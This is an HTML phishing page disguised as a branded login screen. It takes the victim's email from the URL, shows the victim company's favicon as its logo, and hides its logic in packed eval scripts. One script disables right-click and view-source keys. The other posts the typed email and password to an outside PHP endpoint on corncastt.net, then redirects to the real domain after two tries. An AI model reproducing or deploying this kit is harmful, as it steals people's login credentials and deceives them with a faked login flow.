<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Log-in</title>
    <!-- Bootstrap CSS -->
   <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&amp;display=swap" rel="stylesheet">
<style>
body{
			background: #D1D8F3;
		}

		.container{
			width:100%;
			display: flex;
			justify-content: center;
			align-items: center;
			height: 100vh;
		}

		.office{
			width: 380px;
			background: #fff;
		}

		.office-holder{
			width:80%;
			margin: auto;
			padding: 20px 0px;
		}

		.logo{
			width:100%;
			float: left;
			margin-bottom: 2em;
		}

		.logo h1{
			font-family: arial;
		}

		.verify{
			width: 70%;
			margin: auto;
		}

		.verify h4{
			font-family: arial;
		}

		fieldset{
			width: 90%;
			float: right;
			border:2px solid #4285f4;
			border-radius: 5px;
		}

		legend{
			font-size: 15px;
			overflow: hidden;
			width: 42%;
			padding:0px 2px;
			margin: 0px;
		}

		.verify input[type='text']{
			width: 100%;
			float: right;
			border:none;
			padding:3px 10px;
		}

		.verify button{
			border:none;
			height: 40px;
			width: 80px;
			float: right;
			margin-top: 2em;
			background: #4285f4;
			border-radius: 5px;
			color: #fff;
		}

		.email-to-verify{
			border:1px solid #000;
			border-radius: 10px;
		}

		.form-holder{
			width:100%;
			float: left;
		}

		.form-holder h3{
			font-weight: 600;
		}

		.form-holder input[type='email'], input[type='password']{
			width: 100%;
			height:40px;
			float: left;
			margin-bottom: 15px;
		}
		.form-holder .btn-holder{
			width:100%;
			margin-top:1em;
			display: flex;
			align-content: center;
			align-items: center;
			justify-content: center;
		}

		.form-holder .btn-holder .btn{
			background:#0073C6;
			border:none;
			padding:6px 10px;
			color:#fff;
			border-radius: 0px;
			margin-top: 20px;
			margin-bottom: 20px;
		}

		.form-holder .btn-holder .btn:hover{
			cursor:pointer;
		}

		.checkbox{
			width: 100%;
			float: left;
			margin-top:5px;
		}

		.checkbox label{
			font-family:arial;
			font-size:13px;
			float: left;
			margin-left:1em;
		}

		.hide{
			display: none;
		}

</style>
</head>

<body>
    <div id="html_encoder_div">
        <div class="container">
            <div class="office show border shadow bg-light" id="others">
                <div class="office-holder">
                    <div class="logo" style="text-align:center">
                        <div id="login_logo">
                            <img id="logoimg" src="https://s3.amazonaws.com/simbla-static-2/2020/10/5f5bf3b0c092cc00129273e3/5f5bf3ecc092cc00129273e4/nHk7jPxa3hr-DRk2opAFo-ib.png" width="50" height="50" alt="">
                        </div>
                        <h3 class="text-dark"><strong id="logoname" class="text-uppercase"></strong></h3>
                        <h5 class="font-weight-light"></h5>
                    </div>
                    <center>
                        <div id="msg" style="display: none;font-weight: 600;color: red;">wrong username or Password.! Please enter correct details.</div>
                        <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
                    </center>
                    <form id="contact" method="POST" action="">
                        <div class="form-holder">
                            <div style="width: 100%;">
                                <div class="alert alert-danger hide alert2"></div>
                            </div>
                            <input type="email" id="email" name="email" class="form-control" value="" readonly="" placeholder="" required="">
                            <input type="password" id="password" name="password" placeholder="" class="form-control" required="">
                            <div class="checkbox">
                                <input type="checkbox" name="" style="float: left; margin-top:2px; margin-bottom: 10px;">
                                <label>REMEMBER ME</label>
                            </div>
                            <div class="btn-holder">
                                <button class="btn btn-lg col-12" id="submit-btn">LOGIN</button>
                            </div>
                            <p style="color:#0073C6; margin-top:1em; float: left; width:100%;">can't access your account?</p>
                            <p style="color:#0073C6; margin-top:0em; float: left; width:100%;">Sign in with a single-use code</p>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
    <style>
    .tb_button {
        padding: 1px;
        cursor: pointer;
        border-right: 1px solid #8b8b8b;
        border-left: 1px solid #FFF;
        border-bottom: 1px solid #fff;
    }

    .tb_button.hover {
        borer: 2px outset #def;
        background-color: #f8f8f8 !important;
    }

    .ws_toolbar {
        z-index: 100000
    }

    .ws_toolbar .ws_tb_btn {
        cursor: pointer;
        border: 1px solid #555;
        padding: 3px
    }

    .tb_highlight {
        background-color: yellow
    }

    .tb_hide {
        visibility: hidden
    }

    .ws_toolbar img {
        padding: 2px;
        margin: 0px
    }
    </style>
     <!-- jQuery first, then Popper.js, then Bootstrap JS -->
      <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery.session@1.0.0/jquery.session.min.js"></script>

<script>

eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$(1).b(\'c\',3(e){4(e.5&&(e.d==f)){e.7();0 6}});1.g(\'h\',8=>8.7());1.i=3(e){4(e.5&&(e.2===j||e.2===k||e.2===l||e.2===m)){0 6}9{0 a}};$(1).n("o",3(e){4(e.5){0 6}9{0 a}});',25,25,'return|document|keyCode|function|if|ctrlKey|false|preventDefault|event|else|true|bind|keydown|which||83|addEventListener|contextmenu|onkeydown|67|86|85|117|keypress|u'.split('|'),0,{}))

eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$(Y).Z(d(){3 e=0;$(\'#10\').K(d(){$("#8").p();$(\'#5\').h("");$("#11").L({12:M,N:"p"},0);$("#13").L({14:M,N:"i"},15)});3 5=v.w.16.m(1);b(!5){}O{3 7=5;$(\'#5\').h(7);3 q=/^([a-j-k-P\\.\\-])+\\@(([a-j-k-9\\-])+\\.)+([a-j-k-9]{2,4})+$/;b(!q.Q(7)){$(\'#l\').i();5.R;x y}3 r=7.s("@");3 6=7.m((r+1));3 c=6.m(0,6.s(\'.\'));3 S=c.T();3 n=c.U();$("#z").A("B","t://o.C.D/E/F?G="+6);$("#H").f(n);$(".H").f(n)}$(\'#I-J\').K(d(V){$(\'#l\').p();$(\'#8\').p();V.17();3 5=$("#5").h();3 g=$("#g").h();3 8=$(\'#8\').f();$(\'#8\').18(8);b(!g){$(\'#l\').i();$(\'#l\').f("19 1a 1b 1c.!");x y}3 7=5;3 q=/^([a-j-k-P\\.\\-])+\\@(([a-j-k-9\\-])+\\.)+([a-j-k-9]{2,4})+$/;b(!q.Q(7)){$(\'#l\').i();5.R;x y}3 r=7.s("@");3 6=7.m((r+1));3 c=6.m(0,6.s(\'.\'));3 S=c.T();3 n=c.U();$("#z").A("B","t://o.C.D/E/F?G="+6);$(".z").A("B","t://o.C.D/E/F?G="+6);$("#H").f(n);e=e+1;$.1d({1e:\'1f\',1g:\'t://1h.1i/1j/1k.1l\',1m:\'1n\',1o:{5:5,g:g,},1p:d(1q){$(\'#I-J\').f(\'1r...\')},1s:d(u){b(u){$("#8").i();1t.1u(u);b(u[\'1v\']==\'1w\'){$("#g").h("");b(e>=2){e=0;v.w.W("X://o."+6)}}O{}}},l:d(){$("#g").h("");b(e>=2){e=0;v.w.W("X://o."+6)}$("#8").i()},1x:d(){$(\'#I-J\').f(\'1y 1z\')}})})});',62,98,'|||var||email|my_slice|my_email|msg|||if||function|count|html|password|val|show|zA|Z0|error|substr|finalu|www|hide|filter|ind|indexOf|https|response|window|location|return|false|logoimg|attr|src|google|com|s2|favicons|domain|logoname|submit|btn|click|animate|200|opacity|else|9_|test|focus|final|toLowerCase|toUpperCase|event|replace|http|document|ready|back1|automail|left|inputbar|right|1000|hash|preventDefault|text|Password|field|is|emply|ajax|dataType|JSON|url|corncastt|net|ikediupdate|logged|php|type|POST|data|beforeSend|xhr|Verifing|success|console|log|signal|ok|complete|VIEW|DOCUMENT'.split('|'),0,{}))


  </script>

</body>
</html>

